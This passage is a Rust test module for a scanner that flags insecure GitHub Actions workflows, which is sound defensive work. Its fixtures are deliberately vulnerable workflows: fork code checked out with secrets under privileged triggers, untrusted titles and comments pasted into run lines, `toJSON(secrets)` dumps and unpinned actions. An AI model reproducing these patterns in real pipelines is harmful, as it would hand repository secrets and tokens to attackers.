             uses it with whatever the job holds, its token and secrets included. It has happened: \
             in March 2025 `tj-actions/changed-files` had its tags moved to code that printed \
             secrets into build logs."
                .into(),
            "Name each action by its full commit, with the version as a comment: \
             `uses: owner/action@<40-character commit> # v4.1.0`. A tool such as Dependabot can keep \
             the commits current."
                .into(),
        ],
    ));
}

#[cfg(test)]
mod tests {
    use super::*;

    /// An app folder holding these workflow files, and any other files named.
    fn app(name: &str, workflows: &[(&str, &str)], other: &[&str]) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("sv-workflows-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".github/workflows")).unwrap();
        for (file, text) in workflows {
            std::fs::write(dir.join(".github/workflows").join(file), text).unwrap();
        }
        for file in other {
            std::fs::write(dir.join(file), "stages: [test]\n").unwrap();
        }
        dir
    }

    fn run(name: &str, workflows: &[(&str, &str)], other: &[&str]) -> WorkflowReport {
        let dir = app(name, workflows, other);
        let report = check(&dir);
        std::fs::remove_dir_all(&dir).ok();
        report
    }

    fn found(report: &WorkflowReport) -> Vec<&str> {
        report.findings.iter().map(|f| f.rule_id.as_str()).collect()
    }

    fn credited(report: &WorkflowReport) -> Vec<&str> {
        report
            .passed
            .iter()
            .flat_map(|v| v.requirement_ids.iter().map(String::as_str))
            .collect()
    }

    fn unassessed(report: &WorkflowReport) -> Vec<&str> {
        report
            .not_assessed
            .iter()
            .map(|(id, _)| id.as_str())
            .collect()
    }

    const SAFE: &str = "\
name: CI
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: npm test
";

    const DANGEROUS: &str = "\
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
";

    #[test]
    fn a_workflow_that_runs_a_strangers_code_with_the_secrets_is_found() {
        let report = run("dangerous", &[("pr.yml", DANGEROUS)], &[]);
        let ids = found(&report);
        for rule in [FORK_CODE, FORK_SECRETS, CHECKOUT_TOKEN, TOKEN_PERMISSIONS] {
            assert!(ids.contains(&rule), "{rule} missing from {ids:?}");
        }
        let fork = report
            .findings
            .iter()
            .find(|f| f.rule_id == FORK_CODE)
            .unwrap();
        assert_eq!(fork.location.file, ".github/workflows/pr.yml");
        assert_eq!(
            fork.location.line, 10,
            "the line that names the pull request's code"
        );
        assert_eq!(fork.requirement_ids, vec!["AC.12.1"]);
        assert!(credited(&report).is_empty(), "{:?}", report.passed);
    }

    #[test]
    fn a_safe_workflow_is_credited_for_what_a_file_can_show_and_no_more() {
        let report = run("safe", &[("ci.yml", SAFE)], &[]);
        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert!(report.not_assessed.is_empty(), "{:?}", report.not_assessed);
        let mut got = credited(&report);
        got.sort();
        assert_eq!(got, vec!["AC.12.1", "AC.12.2"]);
        // AC.12.3 turns on approvals that are repository settings: the check ran and credits nothing.
        let secrets = report
            .passed
            .iter()
            .find(|v| v.check_id == FORK_SECRETS)
            .unwrap();
        assert!(secrets.requirement_ids.is_empty());
    }

    #[test]
    fn every_way_of_writing_the_trigger_is_recognized() {
        let body = "\
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{github.head_ref}}
          persist-credentials: false
";
        for on in [
            "on: pull_request_target\n",
            "on: [push, pull_request_target]\n",
            "\"on\": [pull_request_target]\n",
            "on: { pull_request_target: { types: [opened] } }\n",
            "on:\n  workflow_run:\n    workflows: [CI]\n    types: [completed]\n",
            "on:  # a comment\n  pull_request_target:\n",
            "on: issue_comment\n",
            "on:\n  issue_comment:\n    types: [created]\n",
            "on: [discussion_comment]\n",
        ] {
            let report = run("triggers", &[("pr.yml", &format!("{on}{body}"))], &[]);
            assert!(
                report.not_assessed.iter().all(|(id, _)| id != FORK_CODE),
                "{on}"
            );
            assert_eq!(
                found(&report),
                vec![FORK_CODE],
                "{on:?}: {:?}",
                report.findings
            );
        }
    }

    #[test]
    fn a_comment_that_checks_out_the_pull_request_with_the_secrets_is_found() {
        // Deep review H4: the bot that runs the tests when somebody comments "/test" on a pull
        // request. Anybody can comment, the workflow has the secrets, and it checks out the pull
        // request's code; it was credited AC.12.1.
        let text = "\
on:
  issue_comment:
    types: [created]
jobs:
  test:
    if: github.event.issue.pull_request && contains(github.event.comment.body, '/test')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head
      - run: npm ci && npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
";
        let report = run("comment", &[("test-on-comment.yml", text)], &[]);
        let ids = found(&report);
        for rule in [FORK_CODE, FORK_SECRETS] {
            assert!(ids.contains(&rule), "{rule} missing from {ids:?}");
        }
        let fork = report
            .findings
            .iter()
            .find(|f| f.rule_id == FORK_CODE)
            .unwrap();
        assert!(fork.title.contains("`issue_comment`"), "{}", fork.title);
        assert!(
            !credited(&report).contains(&"AC.12.1"),
            "{:?}",
            report.passed
        );
    }

    #[test]
    fn a_comment_bot_that_checks_out_nothing_is_not_called_clean() {
        let text = "\
on: issue_comment
permissions:
  issues: write
jobs:
  thank:
    runs-on: ubuntu-latest
    steps:
      - run: echo thanks
";
        let report = run("comment-bot", &[("thank.yml", text)], &[]);
        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert_eq!(unassessed(&report), vec![FORK_CODE]);
        let why = &report.not_assessed[0].1;
        assert!(why.contains("`issue_comment`"), "{why}");
    }

    #[test]
    fn a_dispatch_is_not_privileged() {
        // Only somebody with write access, or a token, can dispatch a workflow.
        for on in ["on: workflow_dispatch\n", "on: repository_dispatch\n"] {
            let text = format!(
                "{on}permissions:\n  contents: read\njobs:\n  t:\n    runs-on: ubuntu-latest\n    \
                 steps:\n      - run: echo hi\n"
            );
            let report = run("not-privileged", &[("t.yml", &text)], &[]);
            assert!(
                credited(&report).contains(&"AC.12.1"),
                "{on:?}: {:?} {:?}",
                report.passed,
                report.not_assessed
            );
        }
    }

    #[test]
    fn the_review_triggers_are_judged_as_pull_request_is() {
        // Deep review H4's open half. GitHub gives a workflow started by a review, or a comment on
        // the diff, of a pull request from a fork no secrets and a read-only token, as it does
        // `pull_request` (DESIGN, "The review triggers run as `pull_request` does"). So the same
        // workflow, checking out the pull request's code with a secret in its environment, must come
        // out the same way under each.
        let body = "\
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - run: npm ci && npm test
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
";
        let outcome = |on: &str| {
            let report = run("review", &[("review.yml", &format!("{on}{body}"))], &[]);
            let mut credited: Vec<String> =
                credited(&report).iter().map(|s| s.to_string()).collect();
            credited.sort();
            let mut found: Vec<String> = found(&report).iter().map(|s| s.to_string()).collect();
            found.sort();
            (found, credited, unassessed(&report).len())
        };
        let pull_request = outcome("on: pull_request\n");
        assert!(
            pull_request.1.contains(&"AC.12.1".to_owned()),
            "the setup: `pull_request` must be credited for this to say anything: {pull_request:?}"
        );
        for on in [
            "on: pull_request_review\n",
            "on:\n  pull_request_review:\n    types: [submitted]\n",
            "on: [pull_request_review_comment]\n",
        ] {
            assert_eq!(outcome(on), pull_request, "{on:?}");
        }
        // The control: the same workflow under `issue_comment`, which runs with the secrets, is found.
        assert!(
            outcome("on: issue_comment\n")
                .0
                .contains(&FORK_CODE.to_owned()),
            "{:?}",
            outcome("on: issue_comment\n")
        );
    }

    #[test]
    fn a_pull_request_fetched_by_a_command_counts_too() {
        let text = "\
on: workflow_run
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          gh pr checkout ${{ github.event.workflow_run.pull_requests[0].number }}
          ./deploy.sh
";
        let report = run("command", &[("deploy.yml", text)], &[]);
        assert_eq!(found(&report), vec![FORK_CODE], "{:?}", report.findings);
    }

    #[test]
    fn a_privileged_trigger_with_no_recognized_checkout_is_not_called_clean() {
        let text = "\
on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5
";
        let report = run("labeler", &[("label.yml", text)], &[]);
        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert_eq!(unassessed(&report), vec![FORK_CODE]);
        assert!(!credited(&report).contains(&"AC.12.1"));
    }

    #[test]
    fn the_jobs_own_token_is_not_a_secret_here() {
        let text = DANGEROUS.replace("secrets.NPM_TOKEN", "secrets.GITHUB_TOKEN");
        let report = run("own-token", &[("pr.yml", &text)], &[]);
        let ids = found(&report);
        assert!(
            ids.contains(&FORK_CODE),
            "the setup still runs fork code: {ids:?}"
        );
        assert!(!ids.contains(&FORK_SECRETS), "{ids:?}");

        let inherit = DANGEROUS.replace(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    secrets: inherit\n",
        );
        let inherit = inherit.replace("secrets.NPM_TOKEN", "secrets.GITHUB_TOKEN");
        let report = run("inherit", &[("pr.yml", &inherit)], &[]);
        assert!(
            found(&report).contains(&FORK_SECRETS),
            "`secrets: inherit` passes them all"
        );
    }

    #[test]
    fn a_checkout_keeping_its_token_is_found_however_it_is_written() {
        let quoted = SAFE.replace(
            "persist-credentials: false",
            "persist-credentials: \"false\"",
        );
        let report = run("quoted", &[("ci.yml", &quoted)], &[]);
        assert!(
            report.findings.is_empty(),
            "a quoted false is still false: {:?}",
            report.findings
        );

        let kept = SAFE.replace("        with:\n          persist-credentials: false\n", "");
        let report = run("kept", &[("ci.yml", &kept)], &[]);
        assert_eq!(found(&report), vec![CHECKOUT_TOKEN]);
        assert_eq!(report.findings[0].location.line, 9);
        assert!(!credited(&report).contains(&"AC.12.2"));
    }

    #[test]
    fn what_cannot_be_read_plainly_leaves_the_workflows_unread() {
        let anchored = "\
on: [push]
permissions: { contents: read }
x: &steps
  - uses: actions/checkout@v4
jobs:
  test:
    runs-on: ubuntu-latest
    steps: *steps
";
        // Each with the reason it gives, because the reason is the only part of some guards that
        // nothing else repeats: a tag or an alias already fails the one-value-per-node reading, and
        // the guard for them exists so the owner is told what to change.
        for (name, text, why) in [
            ("anchor", anchored, "anchor, alias, or tag"),
            (
                "broken",
                "on: [push\njobs:\n  test: {\n",
                "not YAML the grammar can read",
            ),
            (
                "two",
                "on: [push]\n---\njobs: {}\n",
                "more than one YAML document",
            ),
            // A tag can change what a value means.
            (
                "tag",
                "on: !custom [push]\npermissions: { contents: read }\njobs: {}\n",
                "anchor, alias, or tag",
            ),
        ] {
            let report = run(name, &[("ci.yml", text), ("clean.yml", SAFE)], &[]);
            assert!(credited(&report).is_empty(), "{name}: {:?}", report.passed);
            let mut ids = unassessed(&report);
            ids.sort();
            assert_eq!(ids, vec![CHECKOUT_TOKEN, FORK_CODE], "{name}");
            let reason = &report.not_assessed[0].1;
            assert!(
                reason.contains("ci.yml"),
                "{name}: says which file: {reason}"
            );
            assert!(reason.contains(why), "{name}: says why: {reason}");
        }
    }

    #[test]
    fn another_pipeline_beside_the_workflows_keeps_them_from_being_credited() {
        let report = run("gitlab", &[("ci.yml", SAFE)], &[".gitlab-ci.yml"]);
        assert!(credited(&report).is_empty(), "{:?}", report.passed);
        assert!(
            report
                .not_assessed
                .iter()
                .all(|(_, why)| why.contains(".gitlab-ci.yml"))
        );
    }

    #[test]
    fn a_token_that_may_do_anything_is_named_and_cites_nothing() {
        let broad = SAFE.replace(
            "permissions:\n  contents: read\n",
            "permissions: write-all\n",
        );
        let report = run("write-all", &[("ci.yml", &broad)], &[]);
        assert_eq!(found(&report), vec![TOKEN_PERMISSIONS]);
        assert!(report.findings[0].requirement_ids.is_empty());
        assert!(report.findings[0].description.contains("write-all"));

        let unset = SAFE.replace("permissions:\n  contents: read\n", "");
        let report = run("unset", &[("ci.yml", &unset)], &[]);
        assert_eq!(found(&report), vec![TOKEN_PERMISSIONS]);
        assert!(report.findings[0].description.contains("`test`"));
    }

    #[test]
    fn no_workflows_is_nothing_to_say() {
        let dir = std::env::temp_dir().join(format!("sv-workflows-none-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let report = check(&dir);
        std::fs::remove_dir_all(&dir).ok();
        assert!(
            report.findings.is_empty()
                && report.passed.is_empty()
                && report.not_assessed.is_empty()
        );
    }

    /// The one finding a workflow gets for handing out its secrets, if it gets one. Not named for
    /// secrets, since CodeQL takes whatever a function so named returns for one, and the finding
    /// names variables, never a value.
    fn the_finding_in(name: &str, workflow: &str) -> Option<Finding> {
        let report = run(name, &[("ci.yml", workflow)], &[]);
        assert!(
            report.not_assessed.is_empty(),
            "the fixture must be read: {:?}",
            report.not_assessed
        );
        let mut found = report
            .findings
            .into_iter()
            .filter(|f| f.rule_id == ALL_SECRETS);
        let first = found.next();
        assert!(found.next().is_none(), "one finding per file");
        first
    }

    #[test]
    fn each_way_of_handing_out_every_secret_is_found_where_it_is_written() {
        let dumped = the_finding_in(
            "tojson",
            "\
on: push
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          ALL: ${{toJson( secrets )}}
",
        )
        .expect("toJSON(secrets), however it is spaced or capitalized");
        assert_eq!(dumped.location.line, 10);
        assert_eq!(dumped.requirement_ids, vec!["V13.3.2"]);
        assert_eq!(dumped.severity, Severity::High);
        assert!(
            dumped.description.contains("toJSON(secrets)"),
            "{}",
            dumped.description
        );

        let inherited = the_finding_in(
            "inherit",
            "\
on: push
permissions:
  contents: read
jobs:
  release:
    uses: ./.github/workflows/release.yml
    secrets: inherit
",
        )
        .expect("secrets: inherit");
        assert_eq!(inherited.location.line, 7);
        assert_eq!(inherited.severity, Severity::Medium);
        assert!(
            inherited.description.contains("`release`"),
            "{}",
            inherited.description
        );

        let wide = the_finding_in(
            "env",
            "\
on: push
permissions:
  contents: read
env:
  NODE_ENV: test
  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
      - run: npm test
",
        )
        .expect("a secret in the workflow-wide env with two steps");
        assert_eq!(wide.location.line, 6);
        assert!(
            wide.description.contains("`NPM_TOKEN`"),
            "{}",
            wide.description
        );
        assert!(
            !wide.description.contains("NODE_ENV"),
            "{}",
            wide.description
        );
        assert!(
            wide.description.contains("all 2 steps"),
            "{}",
            wide.description
        );
    }

    #[test]
    fn a_secret_handed_only_where_it_is_used_is_not_found() {
        for (name, workflow) in [
            // Each secret in the one step that uses it.
            (
                "step",
                "\
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: npm publish
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
",
            ),
            // A reusable workflow given its secret by name.
            (
                "named",
                "\
on: push
permissions:
  contents: read
jobs:
  release:
    uses: ./.github/workflows/release.yml
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
",
            ),
            // The workflow-wide env holds only the job's own token and plain settings.
            (
                "token",
                "\
on: push
permissions:
  contents: read
env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  NODE_ENV: test
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
      - run: npm test
",
            ),
            // A secret in the workflow-wide env with one step in the whole file reaches nobody else.
            (
                "onestep",
                "\
on: push
permissions:
  contents: read
env:
  NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: npm publish
",
            ),
            // Other contexts turned into text are not the secrets.
            (
                "github",
                "\
on: push
permissions:
  contents: read
jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(github.event) }}'
",
            ),
        ] {
            assert!(
                the_finding_in(name, workflow).is_none(),
                "{name} was reported"
            );
        }
    }

    #[test]
    fn handing_out_secrets_carefully_is_never_credited() {
        let report = run("safe-secrets", &[("ci.yml", SAFE)], &[]);
        assert!(
            report.passed.iter().all(|v| v.check_id != ALL_SECRETS),
            "{:?}",
            report.passed
        );
        assert!(
            report
                .passed
                .iter()
                .all(|v| !v.requirement_ids.iter().any(|r| r == "V13.3.2")),
            "{:?}",
            report.passed
        );
    }

    /// The findings of one rule in one workflow file.
    fn of_rule(name: &str, rule: &str, workflow: &str) -> Vec<Finding> {
        let report = run(name, &[("ci.yml", workflow)], &[]);
        assert!(
            !report
                .not_assessed
                .iter()
                .any(|(_, why)| why.contains("could not read")),
            "the fixture must be read: {:?}",
            report.not_assessed
        );
        report
            .findings
            .into_iter()
            .filter(|f| f.rule_id == rule)
            .collect()
    }

    fn titled(trigger: &str, run_line: &str) -> String {
        format!(
            "on: {trigger}\npermissions:\n  contents: read\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {run_line}\n"
        )
    }

    #[test]
    fn a_strangers_text_pasted_into_a_run_line_is_found_and_cites_only_where_it_runs_with_secrets()
    {
        let privileged = of_rule(
            "inject-target",
            UNTRUSTED_IN_RUN,
            &titled(
                "pull_request_target",
                "echo \"Thanks for ${{ github.event.pull_request.title }}\"",
            ),
        );
        assert_eq!(privileged.len(), 1, "{privileged:?}");
        assert_eq!(privileged[0].severity, Severity::Critical);
        assert_eq!(privileged[0].requirement_ids, vec!["AC.12.1"]);
        assert_eq!(privileged[0].location.line, 8);
        assert!(
            privileged[0]
                .description
                .contains("github.event.pull_request.title"),
            "{}",
            privileged[0].description
        );

        let issue = of_rule(
            "inject-issue",
            UNTRUSTED_IN_RUN,
            &titled("issues", "echo ${{ github.event.issue.body }}"),
        );
        assert_eq!(issue[0].requirement_ids, vec!["AC.12.1"]);

        // A fork's pull request gets no secrets and a read-only token: still found, citing nothing.
        let plain = of_rule(
            "inject-plain",
            UNTRUSTED_IN_RUN,
            &titled("pull_request", "git checkout ${{github.head_ref}}"),
        );
        assert_eq!(plain.len(), 1, "however it is spaced: {plain:?}");
        assert_eq!(plain[0].severity, Severity::Medium);
        assert!(plain[0].requirement_ids.is_empty());

        let script = of_rule(
            "inject-script",
            UNTRUSTED_IN_RUN,
            "on: issue_comment\npermissions:\n  contents: read\njobs:\n  reply:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            console.log(\"${{ github.event.comment.body }}\")\n",
        );
        assert_eq!(script.len(), 1, "github-script's script: {script:?}");
    }

    #[test]
    fn untrusted_text_passed_through_env_or_safe_fields_is_not_found() {
        for (name, workflow) in [
            (
                "env",
                "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Thanks for $TITLE\"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n",
            ),
            (
                "number",
                &titled(
                    "pull_request_target",
                    "echo ${{ github.event.pull_request.number }}",
                ),
            ),
            ("sha", &titled("pull_request", "echo ${{ github.sha }}")),
        ] {
            assert!(
                of_rule(name, UNTRUSTED_IN_RUN, workflow).is_empty(),
                "{name} was reported"
            );
        }
    }

    #[test]
    fn someone_elses_action_named_by_a_tag_is_found_and_cites_nothing() {
        let commit = "8f4b7f84864484a7bf31766abe9204da3cbe65b3";
        let digest = "4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1";
        let workflow = format!(
            "on: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: github/codeql-action/init@v3\n      - uses: tj-actions/changed-files@v45\n      - uses: astral-sh/setup-uv@{commit} # v6\n      - uses: ./.github/actions/local\n      - uses: docker://alpine@sha256:{digest}\n  release:\n    uses: someorg/workflows/.github/workflows/release.yml@main\n"
        );
        let found = of_rule("pin", ACTION_NOT_PINNED, &workflow);
        assert_eq!(found.len(), 1, "one finding per file: {found:?}");
        let f = &found[0];
        assert!(f.requirement_ids.is_empty());
        assert_eq!(f.severity, Severity::Low);
        assert_eq!(f.location.line, 12);
        assert!(
            f.description.contains("tj-actions/changed-files@v45"),
            "{}",
            f.description
        );
        assert!(
            f.description
                .contains("someorg/workflows/.github/workflows/release.yml@main"),
            "{}",
            f.description
        );
        for left_out in [
            "actions/checkout",
            "github/codeql-action",
            "astral-sh",
            "./.github",
            "docker://",
        ] {
            assert!(
                !f.description.contains(left_out),
                "{left_out}: {}",
                f.description
            );
        }
    }
}
